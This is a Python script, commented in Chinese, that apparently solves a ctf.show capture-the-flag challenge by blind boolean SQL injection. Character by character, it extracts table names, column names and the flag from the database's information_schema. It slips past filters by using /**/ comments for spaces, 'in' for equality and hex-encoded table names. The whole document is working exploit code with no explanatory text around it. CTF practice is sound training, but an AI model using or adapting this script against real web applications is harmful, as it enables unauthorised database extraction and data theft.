import requests

chars = "{}-0123456789abcdefghijklmnopqrstuvwxyz" # 待测试字符
url = "http://c1504900-467b-493a-aaa7-b82afb859dd6.challenge.ctf.show/" # 爆破地址

# 爆破表数量
hack_table_count = 2
hack_column_count = 1
# 猜测默认表名最长
default_tableName_length = 10
default_value_length = 50
# 注入字段名
hack_key = "id"
# 空值作为传递的输入
hack_null_value = "-1"
# 筛选目标值
hack_target = "If"

getTable = False
getColumn = False
getValue = True

if getTable == True:
    ### 获取数据表明
    for n in range(0,hack_table_count):
        table_name = ''
        for i in range(1,default_tableName_length):
            for char in chars:
                params = {
                    hack_key : hack_null_value + "/**/or/**/ord(mid((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/in/**/(database())/**/limit/**/1/**/offset/**/"+str(n)+")/**/from/**/"+str(i)+"/**/for/**/1))/**/in/**/("+str(ord(char))+")"
                }
                r = requests.get(url=url,params=params)
                if hack_target in r.text:
                    table_name += char
        print("result:::" + table_name)

table_name = 'flag'
if getColumn == True:
    ### 获取字段名
    table_name_hex = table_name.encode('utf-8').hex()
    table_name_hex = '0x' + table_name_hex
    for n in range(0,hack_column_count):
        column_name = ''
        for i in range(1,default_tableName_length):
            for char in chars:
                params = {
                    hack_key : hack_null_value + "/**/or/**/ord(mid((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/in/**/("+table_name_hex+")/**/limit/**/1/**/offset/**/"+str(n)+")/**/from/**/"+str(i)+"/**/for/**/1))/**/in/**/("+str(ord(char))+")"
                }
                r = requests.get(url=url,params=params)
                if hack_target in r.text:
                    column_name += char
        print("result:::" + column_name)

if getValue == True:
    column_name = 'flag'
    for n in range(0,hack_column_count):
        value = ''
        for i in range(1,default_value_length):
            for char in chars:
                params = {
                    hack_key : hack_null_value + "/**/or/**/ord(mid((select/**/("+column_name+")/**/from/**/("+table_name+")/**/limit/**/1/**/offset/**/"+str(n)+")/**/from/**/"+str(i)+"/**/for/**/1))/**/in/**/("+str(ord(char))+")"
                }
                r = requests.get(url=url,params=params)
                if hack_target in r.text:
                    value += char
        print("result:::" + value)
